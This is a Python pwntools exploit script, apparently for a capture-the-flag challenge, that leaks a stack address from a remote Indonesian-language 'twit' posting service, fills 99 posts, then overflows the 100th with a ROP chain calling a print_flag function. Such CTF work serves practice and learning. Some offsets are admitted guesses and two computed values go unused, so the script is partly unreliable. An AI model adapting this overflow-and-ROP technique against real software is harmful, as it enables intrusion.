from pwn import *

# remote target
p = remote('ctf.asgama.online', 50003)

# Step 1: Leak stack address
p.sendlineafter('Silahkan pilih fitur: ', '3')
p.recvuntil('kami akan memberi: ')
leak = p.recvline().strip()
leaked_stack = int(leak, 16)
log.success(f'Leaked stack address: {hex(leaked_stack)}')

# Step 2: Calculate return address location
# Assuming v4 is right under saved RIP
ret_addr = leaked_stack + 20000  # approximate based on layout

# Step 3: Build payload
payload = b'A' * 200  # fill title
payload += b'B' * 200  # fill body

# ROP chain: overwrite return address with print_flag(1949)
# Suppose we know:
print_flag = 0x401216
pop_rdi = 0x40130b  # pop rdi; ret;

# We’ll write this as the 100th twit
for i in range(99):
    p.sendlineafter('Silahkan pilih fitur: ', '1')
    p.sendlineafter('Masukkan judul twit: ', 'X')
    p.sendlineafter('Masukkan isi twit: ', 'Y')

# The overflow twit
p.sendlineafter('Silahkan pilih fitur: ', '1')
p.sendlineafter('Masukkan judul twit: ', b'A' * 152)
p.sendlineafter('Masukkan isi twit: ',
    b'B' * (200 - 8*3) +             # padding to align
    p64(pop_rdi) +
    p64(1949) +
    p64(print_flag)
)

# Trigger exit to return and execute payload
p.sendlineafter('Silahkan pilih fitur: ', '4')

p.interactive()
